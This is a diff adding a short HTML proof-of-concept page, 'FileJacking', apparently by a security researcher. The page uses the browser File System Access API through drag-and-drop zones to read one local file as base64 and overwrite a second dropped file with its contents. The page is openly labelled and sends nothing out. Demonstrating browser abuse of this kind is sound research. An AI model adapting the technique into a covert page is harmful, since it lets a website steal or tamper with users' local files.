@@ -1,0 +1,208 @@
+<!--
+
+Date  : July 2025
+Author: Print3M
+GitHub: https://github.com/Print3M
+Blog  : https://print3m.github.io/
+
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>FileJacking</title>
+    <meta name="author" content="Print3M" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family: "Inter", sans-serif;
+        background-color: #f4f4f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+
+      .container {
+        display: flex;
+        gap: 60px;
+        padding: 40px;
+      }
+
+      .box {
+        background: white;
+        padding: 30px;
+        border-radius: 20px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        width: 280px;
+      }
+
+      .box p {
+        font-size: 18px;
+        margin-bottom: 20px;
+        color: #333;
+      }
+
+      .dropZone {
+        border: 3px dashed #999;
+        padding: 80px 0;
+        font-size: 28px;
+        color: #555;
+        border-radius: 12px;
+        background-color: #ffe4c4;
+        transition: all 0.2s ease-in-out;
+      }
+
+      .dropZone:hover {
+        background-color: #f0c890;
+        color: #222;
+        cursor: pointer;
+      }
+
+      h1 {
+        text-align: center;
+        font-size: 56px;
+        margin-top: -35px;
+        padding-bottom: 30px;
+      }
+    </style>
+  </head>
+  <body>
+    <div>
+      <h1>FileJacking</h1>
+      <div class="container">
+        <div class="box">
+          <p><strong>Step 1.</strong> Input file: this file will be copied.</p>
+          <div class="dropZone" id="input">DROP</div>
+        </div>
+        <div class="box">
+          <p>
+            <strong>Step 2.</strong> Output file: this file will be overwritten.
+          </p>
+          <div class="dropZone" id="output">DROP</div>
+        </div>
+      </div>
+    </div>
+  </body>
+  <script>
+    let base64Content;
+
+    const input = document.getElementById("input");
+    const output = document.getElementById("output");
+
+    input.addEventListener("dragover", (e) => e.preventDefault());
+    output.addEventListener("dragover", (e) => e.preventDefault());
+
+    input.addEventListener("drop", async (e) => {
+      e.preventDefault();
+
+      const items = [...e.dataTransfer.items].filter(
+        (item) => item.kind === "file"
+      );
+
+      if (items.length === 0) {
+        console.log("[-] Error: no files detected");
+        return;
+      }
+
+      const handlePromises = items.map((item) => item.getAsFileSystemHandle());
+
+      for await (const handle of handlePromises) {
+        if (!handle) continue; // Skip nulls
+        await handle.requestPermission({ mode: "read" });
+
+        if (handle.kind === "directory") {
+          console.log(`[-] Error: dropping directory is not supported`);
+          return;
+        }
+
+        console.log("[+] File dropped:", handle.name);
+
+        // Reading file
+        const file = await handle.getFile();
+        const buffer = await file.arrayBuffer();
+        base64Content = arrayBufferToBase64(buffer);
+
+        console.log("[+] Base64 encoded file content:", base64Content);
+
+        return;
+      }
+    });
+
+    output.addEventListener("drop", async (e) => {
+      e.preventDefault();
+
+      if (!base64Content) {
+        console.log("[-] Error: no content, drop input file first!");
+        return;
+      }
+
+      const items = [...e.dataTransfer.items].filter(
+        (item) => item.kind === "file"
+      );
+
+      if (items.length === 0) {
+        console.log("[-] Error: no files detected");
+        return;
+      }
+
+      const handlePromises = items.map((item) => item.getAsFileSystemHandle());
+
+      for await (const handle of handlePromises) {
+        if (!handle) continue; // Skip nulls
+        await handle.requestPermission({ mode: "readwrite" });
+
+        if (handle.kind === "directory") {
+          console.log(`[-] Error: dropping directory is not supported`);
+          return;
+        }
+
+        console.log("[+] File dropped:", handle.name);
+
+        // Overwritting file
+        const file = await handle.getFile();
+        const writable = await handle.createWritable();
+
+        console.log("[*] Writing, wait...");
+
+        const buffer = base64ToArrayBuffer(base64Content);
+        await writable.write(buffer);
+        await writable.close();
+
+        console.log("[+] File overwritten successfully!");
+
+        return;
+      }
+    });
+
+    function arrayBufferToBase64(buffer) {
+      const bytes = new Uint8Array(buffer);
+      const binary = bytes.reduce(
+        (str, byte) => str + String.fromCharCode(byte),
+        ""
+      );
+      return btoa(binary);
+    }
+
+    function base64ToArrayBuffer(base64) {
+      const binary = atob(base64);
+      const bytes = new Uint8Array(binary.length);
+      for (let i = 0; i < binary.length; i++) {
+        bytes[i] = binary.charCodeAt(i);
+      }
+      return bytes.buffer;
+    }
+  </script>
+</html>
